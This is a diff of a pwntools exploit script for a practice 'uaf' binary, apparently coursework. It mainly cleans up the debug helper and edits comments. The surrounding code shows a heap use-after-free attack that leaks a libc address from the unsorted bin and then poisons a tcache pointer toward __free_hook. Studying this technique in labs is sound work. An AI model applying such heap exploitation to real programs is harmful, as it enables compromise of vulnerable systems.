@@ -17,15 +17,8 @@ uu64    = lambda data               :u64(data.ljust(8, '\0'))
 lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
 
 def debug(breakpoint=''):
-    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
-    gdbscript = 'directory %smalloc/\n' % glibc_dir
-    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
-    gdbscript += 'directory %sstdlib/\n' % glibc_dir
-    gdbscript += 'directory %slibio/\n' % glibc_dir
-    gdbscript += 'directory %self/\n' % glibc_dir
-    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
@@ -50,7 +43,7 @@ def write(idx):
     return s
 
 elf = ELF('./uaf')
-context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
+context(arch = elf.arch ,log_level = 'debug', os = 'linux', terminal = ['tmux', 'splitw', '-hp','62'])
 p = process("./uaf")
 
 
@@ -74,7 +67,7 @@ alloc(2, 0x10)
 ## ** chunk_2 is to prevent chunk_1 from being merged into top chunk
 free(1)
 
-## Since chunk 1 is in unsorted bin, the first 8 bytes is the address of unsorted bin
+## Since chunk 1 is in unsorted bin, the first 8 bytes(fd) is the address of unsorted bin
 ## unsorted_bin --> chunk 1 --> unsorted_bin
 leak_addr = u64(write(1) + "\x00\x00")
 
@@ -86,10 +79,9 @@ free_hook_addr = leak_addr + 0x1c48
 
 
 ## ---------------------- [Step 2] -------------------------- ##
-## Perform UAF by deleting chunk 0 for twice
 free(0)
 ## Size of chunk_0 is 0x90, among size of tcachebin
-## tcache_bin(0x90) --> chunk_0
+## tcache_bin(0xa0) --> chunk_0
 
 
 ## Edit fd pointer of chunk_0, let it point to free_hook
